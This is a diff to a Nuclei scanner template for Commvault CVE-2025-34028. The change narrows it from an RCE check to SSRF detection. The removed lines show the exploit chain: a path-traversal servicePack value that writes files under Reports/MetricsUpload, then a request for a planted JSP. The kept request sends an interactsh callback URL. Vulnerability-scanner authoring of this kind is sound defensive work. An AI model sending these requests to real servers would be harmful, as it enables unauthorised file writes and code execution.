@@ -1,14 +1,14 @@
-id: commvault-cvMessages-detect
+id: commvault-ssrf-deploywebpackage-detect
 
 info:
-  name: Commvault RCE via deployWebpackage.do (CVE-2025-34028)
+  name: Commvault deployWebpackage.do SSRF Detection
   author: nickaures
-  severity: critical
+  severity: high
   description: |
-    Commvault Innovation Release 11.38.0–11.38.19 is vulnerable to a pre-auth RCE via SSRF + Arbitrary File Write through the deployWebpackage.do endpoint.
+    Detects SSRF in Commvault Innovation Release 11.38.0–11.38.19 via deployWebpackage.do endpoint using Interactsh.
   reference:
     - https://watchtowr.com/blog/fire-in-the-hole-were-breaching-the-vault-commvault-remote-code-execution-cve-2025-34028/
-  tags: rce,commvault,preauth,cve,cve2025,ssrf,fileupload
+  tags: ssrf,commvault,preauth,cve,cve2025
   classification:
     cve-id: CVE-2025-34028
 
@@ -20,11 +20,7 @@ http:
         Content-Type: application/x-www-form-urlencoded
         X-Requested-With: XMLHttpRequest
 
-        commcellName={{interactsh-url}}&servicePack=../../Reports/MetricsUpload/nuclei&version=watchtowr
-
-      - |
-        GET /reports/MetricsUpload/nuclei/.tmp/dist-cc/dist-cc/watchTowr.jsp HTTP/1.1
-        Host: {{Hostname}}
+        commcellName={{interactsh-url}}&servicePack=test&version=test
 
     payloads:
       interactsh-url:
@@ -32,15 +28,8 @@ http:
 
     attack: pitchfork
 
-    matchers-condition: and
     matchers:
-      - type: status
-        status:
-          - 200
-
       - type: word
+        part: interactsh_protocol
         words:
-          - "watchTowr was here"
-          - "Server Info: Apache Tomcat"
-          - "Session ID"
-        condition: and
+          - "http"
